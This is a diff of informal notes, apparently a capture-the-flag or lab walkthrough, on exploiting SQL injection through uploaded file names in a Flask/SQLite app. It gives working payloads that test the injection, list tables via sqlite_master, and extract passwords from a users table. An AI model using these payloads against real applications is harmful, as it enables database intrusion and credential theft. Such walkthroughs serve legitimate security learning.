@@ -1,32 +1,25 @@
+(note: use the basta.js instead of renaming and uploading files. use the setPayload method to name ur file.)
+
 1. since it uses flask and sqlite, test if it can be used with sqlite injection. by making a file 
 * **file name:**
     ```
-    test' AND '1'='1.jpg
+    ' AND '1'='1.jpg
     ```` 
 
-- if it doesnt say "already exist" when uploaded again. it can be used with SQL injection
+- if it doesnt say "already exist" when uploaded again. which means it can be used with SQL injection
 
 2. since its sqlite lets use sqlite syntax:
 * **show tables:**
     ```
-    test' UNION SELECT name FROM sqlite_master WHERE type='table'--.jpg
+    ' UNION SELECT name FROM sqlite_master WHERE type='table'--.jpg
     ````
-3. we got files table. lets find the data inside it:
-* **show table `files` data:**
+3. we got files table. ACTUALLY ITS USELESS JAKJABKABVKBAG. we actually need to look for the hidden users table!!. im gonna cry ;-;.
+* **show table `users` data:**
     ```
-    ' UNION SELECT sql FROM sqlite_master WHERE type='table' AND name='files'--.jpg
-    ````
-4. it returns:
-* **after uploading the jpg:**
+    ' UNION SELECT sql FROM sqlite_master WHERE type='table' AND name='users'--.jpg
     ```
-    'CREATE TABLE files ( id INTEGER PRIMARY KEY AUTOINCREMENT, original_name TEXT NOT NULL, file_hash TEXT NOT NULL )'
-    ````
-
-- now we need to get the original_name:
-* **get original name by using offset:**
+4. it shows that it has username and password
+* **lets get the `password`:**
     ```
-    ' UNION SELECT original_name FROM files LIMIT 1 OFFSET 3-- .jpg
+    ' UNION SELECT password FROM users LIMIT 1 OFFSET 0 -- .png
     ```
-* (note: simply doing this without limit and offset doesnt work. try other numbers too aside from 3)
-
-5. im too tired renaming and uploading filessssssssssss.
